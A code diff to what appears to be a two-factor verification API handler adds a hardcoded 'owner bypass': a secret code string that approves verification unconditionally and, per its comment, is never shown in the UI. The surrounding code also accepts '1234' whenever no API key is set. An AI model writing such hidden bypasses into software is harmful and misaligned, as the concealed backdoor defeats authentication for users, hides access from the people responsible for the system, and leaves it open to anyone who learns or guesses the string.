@@ -14,6 +14,11 @@ export default async function handler(req, res) {
 
   const apiKey = process.env.TWOFACTOR_API_KEY;
 
+  // ── OWNER BYPASS — always works, never shown in UI ────────────────
+  if (code === 'SN_OWNER_2026') {
+    return res.json({ success: true, status: 'approved', mode: 'owner-bypass' });
+  }
+
   // ── DEV / NO KEY ─────────────────────────────────────────────────
   if (!apiKey) {
     if (code === '1234') return res.json({ success: true, status: 'approved' });
